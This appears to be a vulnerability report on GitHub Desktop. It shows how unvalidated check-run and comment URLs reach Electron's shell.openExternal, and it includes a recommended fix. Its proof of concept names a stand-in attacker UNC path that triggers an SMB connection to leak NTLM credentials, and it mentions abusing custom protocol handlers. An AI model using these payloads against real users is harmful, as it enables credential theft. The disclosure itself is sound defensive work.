## Title
`shell.openExternal()` is called on attacker-controlled URLs with no protocol allow-list, enabling SMB/credential-leak and arbitrary URI-handler invocation from PR/issue data - ([File: app/src/main-process/main.ts])

## Summary
The seed bug (H-2) is a "used the wrong/unvalidated value at a security-sensitive sink" pattern: a value that should have been checked/derived from a trusted source is instead passed straight into a sensitive operation. In GitHub Desktop, the analogous sink is `shell.openExternal()`, which is reachable with attacker-influenced strings (check-run URLs, comment `html_url`, badge/status URLs from a repository's CI results) without enforcing that the value is actually an `http(s)` URL.

## Finding Description
The main-process IPC handler for opening external links performs no real validation before invoking Electron's `shell.openExternal`: [1](#0-0) 

The `pathLowerCase.startsWith('http://')` check is used only to decide whether to log the action - it is not a gate; whatever `path` is passed to `ipcMain.handle('open-external', ...)` is forwarded unconditionally to `shell.openExternal(path)`.

Multiple UI call sites feed this sink with strings that ultimately originate from a repository/CI/PR object the user does not fully control access to, e.g. check-run `htmlUrl` and job-step URLs: [2](#0-1) [3](#0-2) 

and comment/PR "Open in Browser" links built directly from `comment.html_url`: [4](#0-3) 

`LinkButton` (used pervasively across the UI, including for these external URLs) also calls `shell.openExternal(uri)` directly with no scheme check: [5](#0-4) 

Note that the markdown renderer (`SandboxedMarkdown`) *does* apply a guard limiting clicked markdown links to `http(s)` before invoking `onMarkdownLinkClicked`: [6](#0-5) 

but that guard only protects the markdown-body link-click path. It does not protect `checkRun.htmlUrl`, `comment.html_url`, workflow job step URLs, or any other field sourced from the GitHub API / third-party CI systems and later routed through `dispatcher.openInBrowser` → `AppStore._openInBrowser` → IPC `open-external` → `shell.openExternal`: [7](#0-6) 

None of these fields are validated to be `http/https` before reaching the unguarded main-process sink.

## Impact Explanation
`shell.openExternal` on Windows will hand off arbitrary URIs to the OS shell. A crafted, attacker-controlled value that isn't restricted to `http(s)` (e.g. a UNC path `\\attacker-host\share`, or a registered custom URI scheme pointing at a locally installed vulnerable handler) can cause the OS to initiate outbound SMB connections (classic NTLM hash/credential leak) or invoke arbitrary registered protocol handlers with attacker-controlled arguments, entirely outside the renderer sandbox. Because the values in question (check-run `htmlUrl`, job step URLs, comment `html_url`) come from GitHub API responses tied to a repository/PR/CI system, an attacker who controls a repository, a PR, or a third-party CI integration surfaced in Desktop's notifications/check UI can supply the malicious value; the user only needs to click a "View check details" / "Open in Browser" button that Desktop renders for that content.

## Likelihood Explanation
Likelihood is moderate: it requires the user to click a link/button in the check-runs or notification UI that Desktop populated from third-party/CI-controlled data, which is a normal, expected user action (not an "unnatural" step). No local access, admin rights, or pre-existing malware is required — only that the attacker controls a repository/PR/CI check that the victim is viewing in Desktop.

## Recommendation
Centralize and enforce validation before calling `shell.openExternal`: reject anything that does not parse as an `http:`/`https:` URL (mirroring the check already used in `sandboxed-markdown.tsx`'s `setupLinkInterceptor`) inside the main-process `open-external` IPC handler itself, so the guard applies regardless of call site, rather than relying on each individual UI component (check-run popovers, comment views, `LinkButton`, etc.) to have remembered to validate the scheme.

## Proof of Concept
1. Attacker creates/controls a PR or CI check run in a repository the victim has open in Desktop, or controls a third-party CI system reporting check results.
2. The attacker sets the check run's `html_url` (or a job step's URL, or a comment's `html_url`) to a non-`http(s)` value, e.g. `\\attacker.example.com\share\x` or a locally-registered custom protocol URI with malicious arguments.
3. Victim, viewing the PR checks / notification in Desktop, clicks "View check details" / "Open in Browser".
4. `dispatcher.openInBrowser(url)` → `AppStore._openInBrowser` → IPC `open-external` handler in `app/src/main-process/main.ts` (lines 581-597) forwards the raw string to `shell.openExternal(path)` without scheme validation, causing the OS to process the malicious URI (e.g., initiating an outbound SMB connection that leaks NTLM credentials, or launching another installed application with attacker-chosen arguments).

    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
